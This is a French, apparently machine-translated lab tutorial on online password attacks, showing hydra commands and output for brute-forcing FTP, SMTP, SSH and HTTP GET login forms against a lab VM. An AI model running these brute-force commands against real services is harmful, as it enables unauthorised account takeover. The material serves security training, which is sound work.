Attaque en ligne
================================

Les attaques par mot de passe en ligne impliquent de deviner les mots de passe pour les services en réseau qui utilisent un système d'authentification par nom d'utilisateur et mot de passe, y compris des services tels que HTTP, SSH, VNC, FTP, SNMP, POP3, etc. Cette section présente l'utilisation d'hydra, un outil couramment utilisé pour attaquer les  connexions  . pour divers services réseau.

Hydre

Hydra prend en charge une longue liste de services réseau à attaquer. En utilisant hydra, nous allons forcer brutalement les services réseau tels que les pages de connexion Web, FTP, SMTP et SSH dans cette section. Souvent, dans hydra, chaque service a ses propres options et il faut s'y habituer à la syntaxe à laquelle hydra s'attend. Il est important de vérifier les options d'aide pour plus d'informations et de fonctionnalités.

FTP

Dans le scénario suivant, nous allons effectuer une attaque par force brute contre un serveur FTP. En vérifiant les options d'aide d'hydra, nous savons que la syntaxe d'attaque du serveur FTP est la suivante :

FTP

```
user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

-l ftp  nous spécifions un seul nom d'utilisateur, utilisez -L  pour une liste de mots d'utilisateur

-P Chemin  spécifiant le chemin complet de la liste de mots, vous pouvez spécifier un seul mot de passe en  utilisant -p . 

ftp://10.10.xx  le protocole et l'adresse IP ou le nom de domaine complet (FDQN) de la cible.

N'oubliez pas que parfois vous n'avez pas besoin de recourir à la force brute et que vous pouvez d'abord essayer les informations d'identification par défaut. Essayez d'attaquer le serveur FTP sur la VM attachée et répondez à la question ci-dessous .

SMTP

Semblable aux serveurs FTP, nous pouvons également forcer brutalement les serveurs SMTP en utilisant hydra. La syntaxe est similaire à l'exemple précédent. La seule différence est le protocole ciblé. N'oubliez pas que si vous souhaitez essayer d'autres outils d'attaque de mot de passe en ligne, vous devrez peut-être spécifier le numéro de port, qui est 25. Assurez-vous de lire les options d'aide de l'outil.

SMTP

```
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

SSH

Le forçage brutal SSH peut être courant si votre serveur est accessible à Internet. Hydra prend en charge de nombreux protocoles, y compris SSH. Nous pouvons utiliser la syntaxe précédente pour effectuer notre attaque ! Il est important de noter que les attaques par mot de passe reposent sur une excellente liste de mots pour augmenter vos chances de trouver un nom d'utilisateur et un mot de passe valides.

SSH

```
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v

Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

Pages de connexion HTTP

Dans ce scénario, nous forcerons brutalement  les pages de connexion HTTP . Pour ce faire, vous devez d'abord comprendre ce que vous forcez brutalement. En utilisant hydra, il est important de spécifier le type de requête HTTP, que ce soit  GET  ou  POST . Vérification des options hydra :  hydra http-get-form -U , nous pouvons voir que hydra a la syntaxe suivante pour l'  option http-get-form  :

<url> :<paramètres du formulaire> :<chaîne de condition>[:<facultatif>[:<facultatif>]

Comme nous l'avons mentionné précédemment, nous devons analyser la requête HTTP que nous devons envoyer, et cela peut être fait soit en utilisant les outils de développement de votre navigateur, soit en utilisant un proxy Web tel que Burp Suite.

hydre

```
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra)
finished at 2021-10-13 08:06:45
```

-l admin   nous spécifions un seul nom d'utilisateur, utilisez -L  pour une liste de mots d'utilisateur

-P Chemin  spécifiant le chemin complet de la liste de mots, vous pouvez spécifier un seul mot de passe en  utilisant -p . 

10.10.xx  l'adresse IP ou le nom de domaine complet (FQDN) de la cible.

http-get-form  le type de requête HTTP, qui peut être http-get-form ou http-post-form .   

Ensuite, nous spécifions l'URL, le chemin et les conditions qui sont divisés à l'aide de : 

login-get/index.php  le chemin de la page de connexion sur le serveur Web cible.

username=^USER^&password=^PASS^  les paramètres pour forcer brutalement, nous injectons ^USER^ pour forcer brutalement les noms d'utilisateur et  ^PASS^  pour les mots de passe du dictionnaire spécifié.  

La section suivante est importante pour éliminer les faux positifs en spécifiant la condition "échec" avec F= . 

Et les conditions de succès,  S= . Vous aurez plus d'informations sur ces conditions en analysant la page Web ou à l'étape de l'énumération ! Ce que vous définissez pour ces valeurs dépend de la réponse que vous recevez du serveur pour une tentative de connexion échouée et une tentative de connexion réussie. Par exemple, si vous recevez un message sur la page Web "Mot de passe invalide" après un échec de connexion, définissez  F=Mot de passe invalide .

Ou par exemple, lors de l'énumération, nous avons constaté que le serveur Web sert  logout.php . Après vous être connecté à la page de connexion avec des informations d'identification valides, nous pourrions deviner que nous aurons  logout.php  quelque part sur la page. Par conséquent, nous pourrions dire à hydra de rechercher le texte  logout.php  dans le code HTML pour chaque requête.

S=logout.php  la condition de succès pour identifier les identifiants valides

-f  pour arrêter les attaques par force brute après avoir trouvé un nom d'utilisateur et un mot de passe valides

Vous pouvez l'essayer sur la VM attachée en visitant  http://MACHINE_IP/login-get/index.php . Assurez-vous de déployer la machine virtuelle associée  si vous ne l'avez pas déjà fait pour répondre aux questions ci-dessous.

Enfin, cela vaut la peine de vérifier d'autres outils d'attaques de mots de passe en ligne pour approfondir vos connaissances, tels que :

-   Méduse
-   Ncrack
-   autres!
